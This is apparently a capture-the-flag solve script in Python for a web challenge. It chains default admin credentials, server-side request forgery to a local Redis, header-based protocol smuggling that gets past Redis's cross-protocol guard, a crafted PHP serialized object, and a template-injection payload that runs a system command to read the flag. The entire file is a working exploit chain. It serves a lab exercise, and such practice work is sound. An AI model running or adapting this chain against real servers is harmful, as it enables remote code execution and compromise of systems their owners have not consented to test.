import json, re, sys, time, urllib.request, urllib.error, http.cookiejar

# Point this at your own spawned instance:
#   python3 solve.py <base_url>      e.g. python3 solve.py http://10.129.1.2:1337
B = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://TARGET_HOST:PORT'
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post(p, d, c='application/json', t=15):
    r = urllib.request.Request(B + p, data=d, headers={'Content-Type': c})
    try:    return op.open(r, timeout=t).read().decode()[:80]
    except urllib.error.HTTPError as e: return str(e.code)
    except Exception: return 'timeout (expected: redis holds the socket)'

def resp(*a):   # RESP multibulk - length prefixed, so no Redis inline quoting rules
    return '*%d\r\n' % len(a) + ''.join('$%d\r\n%s\r\n' % (len(x), x) for x in a)

def addslashes(s):
    for a, b in (('\\', '\\\\'), ("'", "\\'"), ('"', '\\"')): s = s.replace(a, b)
    return s

def redis(cmd):
    # PHP's http wrapper emits its own "Host:" line, and Redis kills any connection
    # whose inline argv[0] is exactly "host:" (cross-protocol guard). PHP suppresses
    # its Host only when one appears at the START of a line (check_has_header), so
    # "host:zzz" satisfies PHP and reads as an unknown command to Redis.
    hdr = 'z\r\nhost:zzz\r\n' + cmd + 'X-B: 1'
    return post('/api/service/check', json.dumps(
        {'host': 'http://127.0.0.1:6379/', 'headers': {'X-A': hdr}}).encode())

print('[*] login  ->', post('/admin/login', b'username=admin&password=admin',
                            'application/x-www-form-urlencoded')[:40])

OUT  = '/www/public/static/exports/f1337.txt'
ssti = "{{['/readflag > %s 2>&1']|map('system')|join(',')}}" % OUT
cls  = 'App\\MessageHandler\\SubscribeNotificationHandler'
ser  = 'O:%d:"%s":2:{s:5:"email";s:%d:"%s";s:5:"token";s:1:"x";}' % (
        len(cls), cls, len(ssti), ssti)
body = json.dumps({'body': addslashes(ser), 'headers': []}, separators=(',', ':'))

print('[*] XADD   ->', redis(resp('XADD', 'messages', '*', 'message', body)))

for i in range(20):
    time.sleep(3)
    try:
        out = urllib.request.urlopen(B + '/static/exports/f1337.txt', timeout=10).read().decode()
        m = re.search(r'HTB\{[^}]*\}', out)
        print('\n[+] FLAG:', m.group() if m else repr(out[:200])); break
    except urllib.error.HTTPError as e:
        print(f'    poll {i+1}: {e.code}')
else:
    print('[-] no output')
